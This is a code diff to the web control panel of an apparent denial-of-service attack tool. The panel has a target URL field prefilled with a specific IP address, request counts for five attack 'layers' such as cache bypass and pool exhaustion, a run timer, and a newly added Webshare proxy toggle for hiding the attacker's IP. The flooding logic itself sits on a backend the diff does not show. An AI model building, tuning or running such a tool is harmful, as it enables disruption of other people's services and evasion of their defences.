@@ -124,6 +124,52 @@
             margin-bottom: 4px;
         }
 
+        /* Toggle Switch */
+        .toggle-container {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-top: 8px;
+        }
+        .toggle-switch {
+            position: relative;
+            width: 48px;
+            height: 24px;
+        }
+        .toggle-switch input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+        .toggle-slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: var(--border);
+            transition: .3s;
+            border-radius: 24px;
+        }
+        .toggle-slider:before {
+            position: absolute;
+            content: "";
+            height: 18px;
+            width: 18px;
+            left: 3px;
+            bottom: 3px;
+            background-color: white;
+            transition: .3s;
+            border-radius: 50%;
+        }
+        input:checked + .toggle-slider {
+            background-color: var(--green);
+        }
+        input:checked + .toggle-slider:before {
+            transform: translateX(24px);
+        }
+
         .stats-bar {
             display: flex;
             gap: 24px;
@@ -163,7 +209,6 @@
         .log.warn { color: var(--yellow); }
         .log.debug { color: var(--text-muted); }
 
-        /* scrollbar */
         #console::-webkit-scrollbar { width: 6px; }
         #console::-webkit-scrollbar-track { background: var(--bg); }
         #console::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
@@ -183,30 +228,35 @@
     <span class="badge">Silent AI</span>
 </header>
 
-<!-- Target input -->
 <div class="card">
     <div class="row">
-        <input type="text" id="targetUrl" placeholder="https://target-website.com" style="flex:1">
+        <input type="text" id="targetUrl" placeholder="http://51.68.39.124" style="flex:1">
         <button id="startBtn" onclick="startAttack()">▶ START</button>
         <button id="stopBtn" class="danger" onclick="stopAttack()" disabled>⏹ STOP</button>
     </div>
     <div id="statusText" class="text-muted mt-2">Ready. Enter target and start.</div>
 </div>
 
-<!-- Settings (collapsible) -->
 <details class="card" id="settingsPanel">
     <summary style="cursor:pointer; font-weight:600;">⚙️ Advanced Settings</summary>
     <div class="settings-grid mt-4">
-        <div><label>Layer 1 (Chunked)</label><input type="number" id="l1" value="800" min="1"></div>
-        <div><label>Layer 2 (Recursive)</label><input type="number" id="l2" value="1000" min="1"></div>
-        <div><label>Layer 3 (Cache Bypass)</label><input type="number" id="l3" value="600" min="1"></div>
-        <div><label>Layer 4 (Pool Exhaust)</label><input type="number" id="l4" value="400" min="1"></div>
-        <div><label>Layer 5 (Parser Stress)</label><input type="number" id="l5" value="200" min="1"></div>
+        <div><label>Layer 1 (Chunked)</label><input type="number" id="l1" value="300" min="1"></div>
+        <div><label>Layer 2 (Recursive)</label><input type="number" id="l2" value="200" min="1"></div>
+        <div><label>Layer 3 (Cache Bypass)</label><input type="number" id="l3" value="200" min="1"></div>
+        <div><label>Layer 4 (Pool Exhaust)</label><input type="number" id="l4" value="2000" min="1"></div>
+        <div><label>Layer 5 (Parser Stress)</label><input type="number" id="l5" value="100" min="1"></div>
         <div><label>Duration (seconds)</label><input type="number" id="duration" value="300" min="1"></div>
+    </div>
+    <div class="toggle-container mt-4">
+        <label class="toggle-switch">
+            <input type="checkbox" id="proxyToggle" checked>
+            <span class="toggle-slider"></span>
+        </label>
+        <span style="font-size:14px; font-weight:600;">🌐 Use Proxy (Webshare)</span>
+        <span style="font-size:12px; color:var(--text-muted);">Turn OFF to test if target checks IP</span>
     </div>
 </details>
 
-<!-- Live Stats -->
 <div class="card">
     <div class="stats-bar" id="statsBar">
         <div class="stat-item"><span class="label">RPS:</span> <span id="rps">0</span></div>
@@ -218,14 +268,12 @@
     </div>
 </div>
 
-<!-- Console -->
 <div class="card flex-1" style="display:flex; flex-direction:column;">
     <div style="font-weight:600; margin-bottom:8px;">📟 Live Console</div>
     <div id="console"></div>
 </div>
 
 <script>
-    // ==================== WEBSOCKET LOGIC ====================
     let ws = null;
     let currentAttackId = localStorage.getItem('current_attack') || null;
     let reconnectTimer = null;
@@ -234,6 +282,7 @@
     const startBtn = document.getElementById('startBtn');
     const stopBtn = document.getElementById('stopBtn');
     const statusText = document.getElementById('statusText');
+    const proxyToggle = document.getElementById('proxyToggle');
 
     function log(message, type = 'info') {
         const time = new Date().toLocaleTimeString();
@@ -242,7 +291,6 @@
         div.textContent = `[${time}] ${message}`;
         consoleEl.appendChild(div);
         consoleEl.scrollTop = consoleEl.scrollHeight;
-        // keep max 1000 lines
         while (consoleEl.children.length > 1000) {
             consoleEl.removeChild(consoleEl.firstChild);
         }
@@ -306,6 +354,7 @@
                 l5: parseInt(document.getElementById('l5').value),
             },
             duration: parseInt(document.getElementById('duration').value),
+            proxy_enabled: proxyToggle.checked,
         };
 
         try {
@@ -321,8 +370,8 @@
             }
             currentAttackId = result.attack_id;
             localStorage.setItem('current_attack', currentAttackId);
-            log(`Attack started! ID: ${currentAttackId}`, 'success');
-            statusText.textContent = `Attack running: ${currentAttackId}`;
+            log(`Attack started! ID: ${currentAttackId} | Proxy: ${proxyToggle.checked ? 'ON' : 'OFF'}`, 'success');
+            statusText.textContent = `Attack running: ${currentAttackId} | Proxy: ${proxyToggle.checked ? 'ON' : 'OFF'}`;
             startBtn.disabled = true;
             stopBtn.disabled = false;
             connectWebSocket();
@@ -355,7 +404,6 @@
         statusText.textContent = 'Ready.';
     }
 
-    // On page load, check for existing attack
     (async function init() {
         if (currentAttackId) {
             try {
